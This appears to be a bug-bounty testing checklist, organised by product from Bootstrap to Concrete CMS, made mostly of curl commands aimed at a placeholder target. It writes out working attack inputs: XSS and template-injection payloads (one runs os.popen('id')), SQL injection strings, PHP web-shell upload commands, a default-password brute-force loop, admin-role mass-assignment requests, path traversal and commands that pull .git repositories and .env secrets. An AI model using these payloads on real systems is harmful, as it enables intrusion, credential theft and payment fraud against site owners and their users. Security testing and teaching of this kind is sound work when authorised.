Bootstrap is a popular CSS framework. While generally safe, outdated versions may have known XSS vulnerabilities.

### Check for Outdated Bootstrap Version
**Severity: 🟡 Medium**
```bash
// Check Bootstrap version in the page source
curl -s http://target.com | grep -oi "bootstrap.*[0-9]\.[0-9]\.[0-9]"
// Check for known XSS in older Bootstrap versions (< 4.3.1)
```

### Check for Bootstrap data-* Attribute XSS
**Severity: 🟡 Medium**
```bash
// Bootstrap 3.x tooltips/data attributes XSS
curl -s "http://target.com/?q=<div data-toggle=\"tooltip\" title=\"<img src=x onerror=alert(1)>\">"
// Bootstrap 4.x collapse widget data-parent XSS
```

**References:**
- https://getbootstrap.com/docs/4.3/getting-started/introduction/
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8331

---

## Braintree
<!-- id: braintree | icon: 🛠️ | color: #e06c75 -->
Braintree is a payment processing platform (PayPal subsidiary). Exposed API keys and client tokens can lead to payment fraud.

### Check for Exposed Braintree API Keys
**Severity: 🔴 Critical**
```bash
// Search for Braintree keys in client-side or source code
curl -s http://target.com/app.js | grep -i "braintree"
// Look for patterns like "merchant_id", "public_key", "private_key"
```

### Test Client Token/Authorization Key Exposure
**Severity: 🟠 High**
```bash
// Check if the client token is hardcoded in the frontend
curl -s http://target.com | grep -oE 'braintree.*client[_-]?token["\s:=]+["][^"]+["]'
```

### Test for Payment Logic Flaws
**Severity: 🟠 High**
```bash
// If Braintree is used client-side, try manipulating amount values
// before they reach the server
curl -s -X POST "https://api.target.com/checkout" \
  -H "Content-Type: application/json" \
  -d '{"amount": 0.01, "product": "PREMIUM_ITEM", "nonce": "fake-nonce"}'
```

**References:**
- https://developer.paypal.com/braintree/docs/guides/security
- https://hackerone.com/braintree

---

## BrowserStack
<!-- id: browserstack | icon: 🛠️ | color: #e06c75 -->
BrowserStack is a cloud testing platform. Exposed access keys can allow unauthorized access to testing infrastructure.

### Check for Exposed Access Keys
**Severity: 🟠 High**
```bash
// Search for BrowserStack credentials
curl -s http://target.com/.env | grep -i "browserstack"
grep -r "browserstack" /var/www/ 2>/dev/null
```

### Test for Open Local Testing Sessions
**Severity: 🟡 Medium**
```bash
// BrowserStack Local Testing may expose internal services
// Check for BrowserStack binaries or configs
curl -s http://target.com/browserstack.json
```

**References:**
- https://www.browserstack.com/docs/local-testing

---

## Git
<!-- id: git | icon: 🛠️ | color: #e06c75 -->
Exposed .git directories on web servers can leak the entire source code repository, including credentials, API keys, and application logic.

### Check for Exposed .git Directory
**Severity: 🔴 Critical**
```bash
// Check if .git directory is exposed
curl -s http://target.com/.git/HEAD
curl -s http://target.com/.git/config
```

### Download Entire .git Repository
**Severity: 🔴 Critical**
```bash
// Use git-dumper to download the entire repo
git clone http://target.com/.git/
// Or use tools like git-dumper or gitgraber
python3 git_dumper.py http://target.com/.git/ ./repo
```

### Extract Sensitive Data from Git Log
**Severity: 🔴 Critical**
```bash
// Once .git is cloned, check commit history for secrets
cd ./repo && git log -p | grep -i "password\|secret\|key\|token\|credential"
git log --all --oneline
```

**References:**
- https://github.com/arthaud/git-dumper
- https://github.com/hisxo/gitGraber

---

## .env File Exposure
<!-- id: env-file | icon: 🛠️ | color: #e06c75 -->
Exposed .env files can leak environment variables containing database credentials, API keys, and other sensitive configuration.

### Check for Exposed .env Files
**Severity: 🔴 Critical**
```bash
// Common .env file paths
curl -s http://target.com/.env
curl -s http://target.com/backend/.env
curl -s http://target.com/api/.env
curl -s http://target.com/.env.example
curl -s http://target.com/.env.backup
curl -s http://target.com/.env.local
```

### Check for Backend Framework .env Exposure
**Severity: 🔴 Critical**
```bash
// Laravel, Symfony, Django, and other frameworks use .env
curl -s http://target.com/.env | grep -i "DB_\|API_\|SECRET\|KEY\|TOKEN\|PASSWORD"
```

**References:**
- https://hackerone.com/reports/1188628
- https://hackerone.com/reports/1202321

---

## Azure
<!-- id: azure | icon: 🛠️ | color: #e06c75 -->
Microsoft Azure is a cloud computing platform. Misconfigured storage, functions, and authentication are common bug bounty targets.

### Check for Exposed Azure Storage Blobs
**Severity: 🔴 Critical**
```bash
// Brute-force Azure blob storage containers
curl -s "https://<storageaccount>.blob.core.windows.net/<container>?restype=container&comp=list" -o -
// Common container names: backups, logs, uploads, config, files, assets
```

### Check for Azure Function App Key Exposure
**Severity: 🟠 High**
```bash
// Function apps may expose master keys or function keys in client-side code
curl -s https://target.com/app.js | grep -i "azure\|function\|defaultHostKey"
// Check for exposed Azure functions in JS source maps
```

### Test Azure App Service Authentication
**Severity: 🟠 High**
```bash
// Azure App Service may have Easy Auth configured
curl -s -I "https://target-app.azurewebsites.net/.auth/me"
curl -s -I "https://target-app.azurewebsites.net/.auth/login/aad/callback"
```

### Check for Azure DevOps Token Exposure
**Severity: 🔴 Critical**
```bash
// Search for Azure DevOps PAT tokens
curl -s http://target.com/.env | grep -i "azure\|devops\|pat"
// Look for Azure service principal credentials in config files
```

### Test Azure Blob Public Access
**Severity: 🟠 High**
```bash
// Check if blob containers allow anonymous read access
curl -s -I "https://storageaccount.blob.core.windows.net/container/"
// If returns 200 with x-ms-public-access, the container is publicly accessible
```

**References:**
- https://docs.microsoft.com/en-us/azure/security/
- https://hackerone.com/azure

---

## Aurelia
<!-- id: aurelia | icon: 🛠️ | color: #e06c75 -->
Aurelia is a JavaScript framework. Exposed source maps and client-side template injection can be security issues.

### Check for Source Map Exposure
**Severity: 🟡 Medium**
```bash
// Aurelia may expose source maps in development mode
curl -s http://target.com/scripts/app-bundle.js.map
curl -s http://target.com/dist/aurelia.js.map
```

### Check for Client-Side Template Injection
**Severity: 🟠 High**
```bash
// Aurelia uses string interpolation that may be exploitable
curl -s "http://target.com/?name=\${constructor.constructor('alert(1)')()}"
```

**References:**
- https://aurelia.io/docs/

---

## ArvanCloud
<!-- id: arvancloud | icon: 🛠️ | color: #e06c75 -->
ArvanCloud is a CDN and cloud security provider. Origin IP discovery and WAF bypass are common testing goals.

### Check for Origin IP Bypass
**Severity: 🟠 High**
```bash
// Find the real origin IP behind ArvanCloud's CDN
curl -s https://target.com/ | grep -i "arvancloud\|arvan"
// Check historical DNS records
nslookup target.com 8.8.8.8
// Try direct IP access to bypass WAF
curl -s -H "Host: target.com" http://ORIGIN_IP/
```

### Check for WAF Bypass
**Severity: 🟡 Medium**
```bash
// Test ArvanCloud WAF rules with common bypass techniques
curl -s "https://target.com/search?q=<script>alert(1)</script>"
curl -s "https://target.com/search?q=<ScRiPt>alert(1)</ScRiPt>"
```

**References:**
- https://www.arvancloud.ir/en

---

## Backbone.js
<!-- id: backbone-js | icon: 🛠️ | color: #e06c75 -->
Backbone.js is a JavaScript framework. Client-side template injection and exposed API models are common concerns.

### Check for Client-Side Template Injection
**Severity: 🟠 High**
```bash
// Backbone.js uses _.template which can be exploitable
curl -s "http://target.com/?name=<%= constructor.constructor('alert(1)')() %>"
```

### Check for Exposed Model/Collection Data
**Severity: 🟡 Medium**
```bash
// Backbone.js often embeds initial model data in script tags
curl -s http://target.com | grep -oE 'Backbone\.Model\.extend\({[^}]+}\)'
// Look for embedded JSON data in page source
curl -s http://target.com | grep -oE 'JSON\.parse\("[^"]+'
```

### Check for Mass Assignment via API
**Severity: 🟠 High**
```bash
// Backbone sends model attributes as JSON to the server
// Try adding unexpected fields
curl -s -X PUT "https://api.target.com/model/1" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin","is_admin":true}'
```

**References:**
- https://backbonejs.org/

---

## Backdrop CMS
<!-- id: backdrop-cms | icon: 🛠️ | color: #e06c75 -->
Backdrop CMS is a fork of Drupal. SQL injection and authentication bypass have been found in older versions.

### Check for Exposed Installation
**Severity: 🟡 Medium**
```bash
// Backdrop CMS common paths
curl -s http://target.com/core/install.php
curl -s http://target.com/core/update.php
curl -s http://target.com/README.md
```

### Check for Backdrop Database Version Exposure
**Severity: 🟡 Medium**
```bash
// Check for version disclosure
curl -s http://target.com/core/misc/drupal.js | grep -i "backdrop\|version"
curl -s http://target.com/CHANGELOG.txt
```

**References:**
- https://backdropcms.org/security

---

## Batflat
<!-- id: batflat | icon: 🛠️ | color: #e06c75 -->
Batflat is a lightweight CMS. Known CVEs include authentication bypass and file upload vulnerabilities.

### Check for Default Admin Path
**Severity: 🟡 Medium**
```bash
// Batflat default admin path
curl -s http://target.com/admin/
curl -s http://target.com/admin/login
```

### Check for File Upload Bypass
**Severity: 🔴 Critical**
```bash
// Try uploading PHP files via admin panel
curl -s -F "file=@shell.php" "http://target.com/admin/upload"
// Check for path traversal in file operations
curl -s "http://target.com/admin/media?dir=../../../etc/"
```

### Check for SQL Injection
**Severity: 🔴 Critical**
```bash
// Known Batflat SQL injection vectors
curl -s "http://target.com/blog/search?q=' OR 1=1--"
```

**References:**
- https://github.com/sruupl/batflat

---

## BigCommerce
<!-- id: bigcommerce | icon: 🛠️ | color: #e06c75 -->
BigCommerce is a SaaS e-commerce platform. API misconfigurations and storefront vulnerabilities can lead to data exposure.

### Check for Storefront Information Disclosure
**Severity: 🟡 Medium**
```bash
// BigCommerce storefront exposes product/category data via API
curl -s https://store-abc123.mybigcommerce.com/api/storefront/products
curl -s https://store-abc123.mybigcommerce.com/api/storefront/catalog/category
```

### Check for Exposed API Credentials
**Severity: 🔴 Critical**
```bash
// Check client-side code for BigCommerce API credentials
curl -s https://target.com | grep -i "bigcommerce\|stencil\|X-Auth-Client\|X-Auth-Token"
// BigCommerce API tokens in JS files
curl -s https://target.com/assets/js/theme.js | grep -i "token\|key\|secret"
```

### Test for CSP Bypass
**Severity: 🟡 Medium**
```bash
// BigCommerce stores may allow script injection via widgets
curl -s -I -X OPTIONS https://target.com | grep -i "content-security-policy"
// Check for widget/script tag injection in product descriptions
```

**References:**
- https://developer.bigcommerce.com/api-docs/getting-started/security

---

## Bitrix24
<!-- id: bitrix24 | icon: 🛠️ | color: #e06c75 -->
Bitrix24 is a CRM and collaboration platform (similar to 1C-Bitrix). Exposed installations can leak sensitive business data.

### Check for Exposed Bitrix24 Portal
**Severity: 🟡 Medium**
```bash
// Bitrix24 self-hosted or cloud instance enumeration
curl -s https://target.com/bitrix/
curl -s https://target.com/bitrix/admin/
```

### Check for Authentication Bypass
**Severity: 🟠 High**
```bash
// Try accessing admin pages without authentication
curl -s "https://target.com/bitrix/admin/iblock_list_admin.php?lang=en"
// Check for public form submissions that bypass auth
```

### Check for API Key Exposure
**Severity: 🟠 High**
```bash
// Search for Bitrix24 REST API keys
curl -s https://target.com/bitrix/js/main/core/core.js | grep -i "rest\|ajax"
// Look for webhook URLs containing secrets
```

**References:**
- https://www.bitrix24.com/security/

---

## Blazor
<!-- id: blazor | icon: 🛠️ | color: #e06c75 -->
Blazor is a .NET framework for building interactive web UIs. SignalR hub enumeration and DLL/source map exposure are key concerns.

### Check for Blazor Server Configuration
**Severity: 🟡 Medium**
```bash
// Blazor Server uses SignalR for real-time communication
curl -s -I "https://target.com/_blazor/negotiate"
// Check for exposed Blazor circuit information
curl -s "https://target.com/_blazor/disconnect"
```

### Check for Blazor WASM DLL Exposure
**Severity: 🟠 High**
```bash
// Blazor WebAssembly DLLs are served client-side and can be decompiled
curl -s "https://target.com/_framework/blazor.webassembly.js"
curl -s "https://target.com/_framework/"
// Download and inspect DLL files with ILSpy/dnSpy
```

### Check for Sensitive Data in Blazor WASM
**Severity: 🔴 Critical**
```bash
// Client-side Blazor apps may embed API keys in compiled DLLs
curl -s https://target.com/_framework/ | grep -oE '"App\.domain\.dll"' | while read dll; do
  curl -s "https://target.com/_framework/$dll" -o "app.dll" && strings "app.dll" | grep -i "key\|secret\|token\|password"
done
```

**References:**
- https://docs.microsoft.com/en-us/aspnet/core/blazor/security/

---

## Blesta
<!-- id: blesta | icon: 🛠️ | color: #e06c75 -->
Blesta is a billing and client management platform. Default credentials and exposed admin panels are common issues.

### Check for Exposed Admin Panel
**Severity: 🟠 High**
```bash
// Blesta default admin paths
curl -s http://target.com/admin/
curl -s http://target.com/admin/login
```

### Check for Default Credentials
**Severity: 🔴 Critical**
```bash
// Try default Blesta credentials
curl -s -X POST "http://target.com/admin/login" \
  -d "username=admin&password=admin" -L
// Common defaults: admin/admin, admin/blesta
```

### Check for Database Configuration Exposure
**Severity: 🔴 Critical**
```bash
// Blesta config file location
curl -s http://target.com/config/blesta.php
curl -s http://target.com/config/database.php
```

**References:**
- https://www.blesta.com/

---

## Bludit
<!-- id: bludit | icon: 🛠️ | color: #e06c75 -->
Bludit is a flat-file CMS. Several critical CVEs exist including RCE (CVE-2019-16113, CVE-2020-14083) and authentication bypass.

### Check for Version Disclosure
**Severity: 🟡 Medium**
```bash
// Bludit version in page source
curl -s http://target.com | grep -i "bludit\|BLUDIT_VERSION"
curl -s http://target.com/bl-kernel/css/bludit.css
```

### Check for RCE via API (CVE-2019-16113)
**Severity: 🔴 Critical**
```bash
// CVE-2019-16113: Authenticated RCE via image upload with PHP payload
// Steps: Login -> upload image with PHP code -> access uploaded file
curl -s -c cookies.txt -b cookies.txt -X POST "http://target.com/admin/ajax/upload-images" \
  -F "images[]=@shell.php" -F "uuid=test"
// Check for CVE-2020-14083: Unauthenticated RCE via HTTP headers
curl -s "http://target.com/admin/" -H "X-Forwarded-For: 127.0.0.1"
```

### Check for Authentication Bypass
**Severity: 🔴 Critical**
```bash
// Bludit 3.9.2 has a bruteforce protection bypass
// The API logs don't block brute-force attempts
for pass in password admin 123456 admin123; do
  curl -s -X POST "http://target.com/admin/login" \
    -d "username=admin&password=$pass&save=true&token=TOKEN"
done
```

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16113
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-14083

---

## Bolt CMS
<!-- id: bolt-cms | icon: 🛠️ | color: #e06c75 -->
Bolt CMS is an open-source CMS. SQL injection and file upload vulnerabilities have been found in older versions.

### Check for Exposed Admin Panel
**Severity: 🟡 Medium**
```bash
// Bolt CMS admin paths
curl -s http://target.com/bolt/
curl -s http://target.com/bolt/login
```

### Check for Database Exposure
**Severity: 🟠 High**
```bash
// Bolt stores database in app/database/ by default
curl -s http://target.com/app/database/bolt.db
// Check for .sqlite backup files
curl -s http://target.com/app/database/bolt.db.bak
```

**References:**
- https://docs.bolt.cm/security

---

## Bottle
<!-- id: bottle | icon: 🛠️ | color: #e06c75 -->
Bottle is a Python microframework. Debug mode exposure and server-side template injection are key concerns.

### Check for Debug Mode
**Severity: 🔴 Critical**
```bash
// Bottle debug mode exposes interactive debugger with code execution
curl -s "http://target.com:8080/"
// Trigger an error to see if debug mode is enabled
curl -s "http://target.com:8080/test'
```

### Check for SSTI (Server-Side Template Injection)
**Severity: 🔴 Critical**
```bash
// Bottle uses SimpleTemplate or Mako/Jinja2
curl -s "http://target.com/welcome?name={{7*7}}"
// If {{49}} is returned, SSTI is present
curl -s "http://target.com/search?q={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
```

### Check for Default Server Header
**Severity: 🟡 Medium**
```bash
// Bottle defaults show version in Server header
curl -s -I http://target.com/ | grep -i "server.*bottle"
```

**References:**
- https://bottlepy.org/docs/dev/

---

## Bugzilla
<!-- id: bugzilla | icon: 🛠️ | color: #e06c75 -->
Bugzilla is a web-based bug tracking system. Information disclosure via exposed configurations and old CVEs are common.

### Check for Exposed Installation
**Severity: 🟡 Medium**
```bash
// Bugzilla common paths
curl -s http://target.com/bugzilla/
curl -s http://target.com/bugzilla/describecomponents.cgi
curl -s http://target.com/bugzilla/query.cgi
```

### Check for User Enumeration
**Severity: 🟡 Medium**
```bash
// Bugzilla may expose user email addresses
curl -s "http://target.com/bugzilla/whining.cgi"
// List users via user preferences page
curl -s "http://target.com/bugzilla/userprefs.cgi"
```

### Check for Information Disclosure
**Severity: 🟡 Medium**
```bash
// Bugzilla can leak internal bugs and security issues
curl -s "http://target.com/bugzilla/buglist.cgi?bug_status=__all__"
// Check for localconfig file exposure
curl -s http://target.com/bugzilla/localconfig
```

**References:**
- https://www.bugzilla.org/security/

---

## Bunny CDN
<!-- id: bunny-cdn | icon: 🛠️ | color: #e06c75 -->
Bunny CDN is a content delivery network. Origin IP discovery and storage zone misconfigurations are common targets.

### Check for Origin IP Bypass
**Severity: 🟠 High**
```bash
// Find origin IP behind Bunny CDN
curl -s -I https://target.com/ | grep -i "bunny\|cdn"
// Check historical DNS for original IP
nslookup target.com 8.8.8.8
```

### Check for Exposed Storage Zone
**Severity: 🔴 Critical**
```bash
// BunnyCDN storage zones may be publicly accessible
curl -s https://storage.bunnycdn.com/STORAGE_ZONE_NAME/
// Check for FTP access to storage zone
```

### Check for Pull Zone Misconfiguration
**Severity: 🟡 Medium**
```bash
// Pull zone URL patterns
curl -s https://target.b-cdn.net/
curl -s https://TARGET_NAME.b-cdn.net/path/to/file
```

**References:**
- https://bunny.net/docs/

---

## CakePHP
<!-- id: cakephp | icon: 🛠️ | color: #e06c75 -->
CakePHP is a PHP framework. Debug mode exposure, SQL injection, and mass assignment are common concerns.

### Check for Debug Mode
**Severity: 🔴 Critical**
```bash
// CakePHP debug mode reveals database config and stack traces
curl -s "http://target.com/debug_kit/"
curl -s "http://target.com/cakephp/debug_kit"
// Trigger error to see debug output
curl -s "http://target.com/controller/nonexistent"
```

### Check for Mass Assignment
**Severity: 🟠 High**
```bash
// CakePHP mass assignment protection bypass
curl -s -X PUT "http://target.com/users/edit/1" \
  -H "Content-Type: application/json" \
  -d '{"User": {"role": "admin", "is_admin": 1}}'
```

### Check for Configuration File Exposure
**Severity: 🔴 Critical**
```bash
// CakePHP config files
curl -s http://target.com/config/app.php
curl -s http://target.com/app/config/database.php
curl -s http://target.com/app/Config/database.php
```

### Check for Security Component Misconfiguration
**Severity: 🟡 Medium**
```bash
// Check if CSRF protection is enabled
curl -s -X POST "http://target.com/users/login" \
  -d "username=admin&password=test"
// If no CSRF token is required, security component may be disabled
```

**References:**
- https://book.cakephp.org/4/en/security.html
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-35677

---

## Cachet
<!-- id: cachet | icon: 🛠️ | color: #e06c75 -->
Cachet is an open-source status page system. Exposed admin panels and API key leakage are common findings.

### Check for Exposed Admin Panel
**Severity: 🟡 Medium**
```bash
// Cachet admin path
curl -s http://target.com/dashboard/
curl -s http://target.com/auth/login
```

### Check for API Key Exposure
**Severity: 🟠 High**
```bash
// Cachet API endpoint
curl -s http://target.com/api/v1/components
// Check for exposed API tokens in page source
curl -s http://target.com | grep -i "cachet\|X-Cachet-Token\|api_key"
```

### Check for Debug Mode
**Severity: 🟠 High**
```bash
// Cachet debug mode in .env
curl -s http://target.com/.env | grep -i "cachet\|APP_DEBUG\|DB_"
// Check for stack trace exposure
curl -s http://target.com/__debug
```

**References:**
- https://github.com/cachethq/cachet

---

## Canvas LMS
<!-- id: canvas-lms | icon: 🛠️ | color: #e06c75 -->
Canvas LMS is a learning management system widely used in education. Exposed APIs and privilege escalation are common targets.

### Check for Exposed Canvas Instance
**Severity: 🟡 Medium**
```bash
// Canvas LMS common paths
curl -s http://target.com/login/canvas
curl -s http://target.com/courses
```

### Check for API Token Exposure
**Severity: 🟠 High**
```bash
// Canvas API access without authentication
curl -s https://target.com/api/v1/courses
curl -s https://target.com/api/v1/accounts
// Check for public course listings
curl -s https://target.com/api/v1/course_progress
```

### Test for Privilege Escalation
**Severity: 🔴 Critical**
```bash
// Try to access admin functions via API
curl -s "https://target.com/api/v1/accounts/1" \
  -H "Authorization: Bearer TOKEN"
// Check for role manipulation
curl -s -X PUT "https://target.com/api/v1/users/1" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"user":{"roles":"admin"}}'
```

**References:**
- https://community.canvaslms.com/t5/Security/ct-p/security

---

## Caddy
<!-- id: caddy | icon: 🛠️ | color: #e06c75 -->
Caddy is a modern web server with automatic HTTPS. Its admin API and configuration exposure are key security concerns.

### Check for Exposed Admin API
**Severity: 🔴 Critical**
```bash
// Caddy admin API is on port 2019 by default
curl -s http://target.com:2019/config/
curl -s http://target.com:2019/config/apps/http/servers
```

### Check for Automatic HTTPS Info Disclosure
**Severity: 🟡 Medium**
```bash
// Certificate info via admin API
curl -s http://target.com:2019/config/apps/tls/
```

### Check for Unauthorized Config Modification
**Severity: 🔴 Critical**
```bash
// Try posting new config to the admin API
curl -s -X POST "http://target.com:2019/load" \
  -H "Content-Type: application/json" \
  -d '{"apps": {"http": {"servers": {"example": {"listen": [":8080"]}}}}}'
```

**References:**
- https://caddyserver.com/docs/

---

## CentOS
<!-- id: centos | icon: 🛠️ | color: #e06c75 -->
CentOS is a Linux distribution. End-of-life versions (CentOS 6, 7, 8) miss security patches and are common findings.

### Check for End-of-Life Version
**Severity: 🔴 Critical**
```bash
// Identify CentOS version via HTTP headers or fingerprinting
curl -s -I http://target.com/ | grep -i "server\|centos"
curl -s http://target.com/ | grep -i "centos"
```

### Check for Missing Security Patches
**Severity: 🟠 High**
```bash
// Common outdated package indicators
curl -s http://target.com/phpinfo.php 2>/dev/null | grep -i "centos\|system"
nmap -sV -p 22,80,443 target.com --script banner
```

**References:**
- https://www.centos.org/

---

## Chamilo
<!-- id: chamilo | icon: 🛠️ | color: #e06c75 -->
Chamilo is an open-source LMS platform. Multiple CVEs exist for SQL injection, XSS, and file upload bypass.

### Check for Version and Path Disclosure
**Severity: 🟡 Medium**
```bash
// Chamilo common paths and version detection
curl -s http://target.com/main/inc/lib/phpinfo.php
curl -s http://target.com/documentation/CHANGELOG
curl -s http://target.com/README.txt
```

### Check for SQL Injection
**Severity: 🔴 Critical**
```bash
// Known Chamilo SQLi vectors
curl -s "http://target.com/main/calendar/agenda_list.php?type=1' OR '1'='1"
curl -s "http://target.com/main/admin/configure.php?section=1' UNION SELECT 1,2,3--"
```

### Check for Arbitrary File Upload
**Severity: 🔴 Critical**
```bash
// Chamilo file upload endpoints
curl -s -F "file=@shell.php" "http://target.com/main/inc/lib/fileUpload.php"
curl -s -F "file=@shell.php" "http://target.com/main/upload.php"
```

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-34961

---

## Cherokee
<!-- id: cherokee | icon: 🛠️ | color: #e06c75 -->
Cherokee is a lightweight web server. Outdated installations may have HTTP request smuggling or info disclosure issues.

### Check for Server Header Disclosure
**Severity: 🟡 Medium**
```bash
// Cherokee exposes version in Server header
curl -s -I http://target.com/ | grep -i "server"
```

### Check for Directory Listing
**Severity: 🟡 Medium**
```bash
// Directory listing on Cherokee
curl -s http://target.com/icons/
curl -s http://target.com/files/
```

**References:**
- https://cherokee-project.com/

---

## CherryPy
<!-- id: cherrypy | icon: 🛠️ | color: #e06c75 -->
CherryPy is a Python web framework. Debug mode exposure and path traversal are common security issues.

### Check for Debug Mode
**Severity: 🟠 High**
```bash
// CherryPy debug mode reveals tracebacks
curl -s "http://target.com/nonexistent-path"
```

### Check for Server Header
**Severity: 🟡 Medium**
```bash
// CherryPy reveals itself in HTTP headers
curl -s -I http://target.com/ | grep -i "server"
```

**References:**
- https://docs.cherrypy.dev/

---

## CiviCRM
<!-- id: civicrm | icon: 🛠️ | color: #e06c75 -->
CiviCRM is an open-source constituent relationship management platform. Exposed API endpoints and SQL injection are key concerns.

### Check for Exposed Paths
**Severity: 🟡 Medium**
```bash
// CiviCRM common paths
curl -s http://target.com/civicrm/
curl -s http://target.com/sites/all/modules/civicrm/
curl -s http://target.com/administrator/components/com_civicrm/
```

### Check for API Exposure
**Severity: 🟠 High**
```bash
// CiviCRM REST API endpoints
curl -s "http://target.com/civicrm/ajax/rest?entity=Contact&action=get"
curl -s "http://target.com/civicrm/api/rest?entity=Contact&json=1"
```

### Check for Database Configuration
**Severity: 🔴 Critical**
```bash
// CiviCRM config files
curl -s http://target.com/sites/default/civicrm.settings.php
curl -s http://target.com/civicrm.settings.php
```

**References:**
- https://civicrm.org/

---

## CKAN
<!-- id: ckan | icon: 🛠️ | color: #e06c75 -->
CKAN is an open-source data portal platform. Exposed API endpoints and data leakage are common security issues.

### Check for Exposed API
**Severity: 🟡 Medium**
```bash
// CKAN API endpoints
curl -s http://target.com/api/3/
curl -s http://target.com/api/action/package_list
curl -s http://target.com/api/util/dataset/autocomplete?incomplete=test
```

### Check for Data Leakage
**Severity: 🟠 High**
```bash
// Check if private datasets are accessible without auth
curl -s http://target.com/api/action/current_package_list_with_resources
curl -s http://target.com/api/action/dashboard_activity_list
```

### Check for Admin Panel
**Severity: 🟡 Medium**
```bash
// CKAN admin paths
curl -s http://target.com/user/login
curl -s http://target.com/dashboard/
```

**References:**
- https://docs.ckan.org/

---

## Claris FileMaker
<!-- id: claris-filemaker | icon: 🛠️ | color: #e06c75 -->
Claris FileMaker (formerly FileMaker Pro) is a database platform. Exposed WebDirect and API endpoints can leak sensitive data.

### Check for Exposed WebDirect
**Severity: 🟠 High**
```bash
// FileMaker WebDirect common paths
curl -s http://target.com/fmi/webd/
curl -s http://target.com/fmi/iwp/
curl -s http://target.com/fmi/xml/FMPXMLRESULT.xml
```

### Check for FileMaker API Access
**Severity: 🟠 High**
```bash
// FileMaker Data API
curl -s https://target.com/fmi/data/v1/databases
curl -s https://target.com/fmi/data/v2/databases
```

### Check for Default Credentials
**Severity: 🔴 Critical**
```bash
// Try default credentials
curl -s -u "admin:admin" "https://target.com/fmi/data/v1/databases"
curl -s -u "admin:filemaker" "https://target.com/fmi/data/v1/databases"
```

**References:**
- https://help.claris.com/en/server-help/

---

## CleanTalk
<!-- id: cleantalk | icon: 🛠️ | color: #e06c75 -->
CleanTalk is a spam protection service. API key leakage can lead to service abuse.

### Check for API Key Exposure
**Severity: 🟠 High**
```bash
// Search for CleanTalk API keys in source code
curl -s http://target.com/ | grep -i "cleantalk\|ct_key\|access_key"
curl -s http://target.com/wp-content/plugins/cleantalk-spam-protect/ | head -5
```

**References:**
- https://cleantalk.org/

---

## ClickFunnels
<!-- id: clickfunnels | icon: 🛠️ | color: #e06c75 -->
ClickFunnels is a sales funnel builder. Exposed API tokens and subdomain takeover are common concerns.

### Check for Origin IP Discovery
**Severity: 🟡 Medium**
```bash
// Find the real origin IP behind ClickFunnels
curl -s -I https://target.com/ | grep -i "cloudflare\|server"
nslookup target.com
```

### Check for API Token Leaks
**Severity: 🟠 High**
```bash
// Search for ClickFunnels API tokens
curl -s http://target.com/app.js | grep -i "clickfunnels\|api_key\|access_token"
```

**References:**
- https://www.clickfunnels.com/

---

## CodeIgniter
<!-- id: codeigniter | icon: 🛠️ | color: #e06c75 -->
CodeIgniter is a PHP framework. Debug mode exposure, SQL injection, and file path disclosure are common findings.

### Check for Debug Mode
**Severity: 🟠 High**
```bash
// CodeIgniter debug/profiler mode
curl -s "http://target.com/index.php?DEBUG=1"
curl -s "http://target.com/index.php?PROFILER=1"
```

### Check for Database Configuration Exposure
**Severity: 🔴 Critical**
```bash
// CodeIgniter database config file paths
curl -s http://target.com/application/config/database.php
curl -s http://target.com/app/config/database.php
curl -s http://target.com/config/database.php
```

### Check for SQL Injection via Query Binding Bypass
**Severity: 🔴 Critical**
```bash
// Test for SQLi when query binding is not used
curl -s "http://target.com/search?q=1' UNION SELECT * FROM users--"
```

### Check for Path Disclosure
**Severity: 🟡 Medium**
```bash
// Trigger errors to reveal file paths
curl -s "http://target.com/index.php/nonexistent/controller"
curl -s "http://target.com/application/controllers/nonexistent.php"
```

**References:**
- https://codeigniter.com/userguide3/security.html

---

## CodeMirror
<!-- id: codemirror | icon: 🛠️ | color: #e06c75 -->
CodeMirror is a code editor component. Its presence in an app may indicate exposed code editors or admin panels.

### Check for Exposed CodeMirror Paths
**Severity: 🟡 Medium**
```bash
// CodeMirror common paths
curl -s http://target.com/codemirror/
curl -s http://target.com/lib/codemirror.js
```

### Check for Editor Exposure in Admin Panels
**Severity: 🟠 High**
```bash
// Look for CodeMirror in admin pages
curl -s http://target.com/admin/ | grep -i "codemirror"
curl -s http://target.com/wp-admin/ | grep -i "codemirror"
```

**References:**
- https://codemirror.net/

---

## Combodo iTop
<!-- id: combodo-itop | icon: 🛠️ | color: #e06c75 -->
Combodo iTop is an IT service management platform. SQL injection, RCE, and credential exposure have been found.

### Check for Exposed Installation
**Severity: 🟡 Medium**
```bash
// iTop common paths
curl -s http://target.com/itop/
curl -s http://target.com/pages/UI.php
curl -s http://target.com/webservices/
```

### Check for Default Admin Access
**Severity: 🔴 Critical**
```bash
// Default iTop credentials
curl -s -u "admin:admin" "http://target.com/pages/UI.php"
curl -s -u "administrator:administrator" "http://target.com/pages/UI.php"
```

### Check for Configuration Exposure
**Severity: 🔴 Critical**
```bash
// iTop config file
curl -s http://target.com/conf/production/config-itop.php
curl -s http://target.com/itop/conf/production/config-itop.php
```

**References:**
- https://www.combodo.com/itop

---

## CometChat
<!-- id: cometchat | icon: 🛠️ | color: #e06c75 -->
CometChat is a messaging platform. Exposed API keys and authentication bypass are common concerns.

### Check for API Key Exposure
**Severity: 🟠 High**
```bash
// Search for CometChat keys in source
curl -s http://target.com/ | grep -i "cometchat\|apiKey\|appID"
curl -s http://target.com/app.js | grep -i "cometchat"
```

### Check for Exposed Endpoints
**Severity: 🟡 Medium**
```bash
// CometChat common paths
curl -s http://target.com/cometchat/
curl -s http://target.com/cometchat/cc.php
```

**References:**
- https://www.cometchat.com/

---

## Concrete CMS
<!-- id: concrete-cms | icon: 🛠️ | color: #e06c75 -->
Concrete CMS (formerly concrete5) is an open-source CMS. SQL injection, XSS, and file upload vulnerabilities have been found.

### Check for Exposed Installation
**Severity: 🟡 Medium**
```bash
// Concrete CMS common paths
curl -s http://target.com/index.php/tools/
curl -s http://target.com/concrete/
curl -s http://target.com/updates/
```

### Check for Admin Path Exposure
**Severity: 🟡 Medium**
```bash
// Concrete CMS admin paths
curl -s http://target.com/index.php/dashboard/
curl -s http://target.com/dashboard/
curl -s http://target.com/login
```

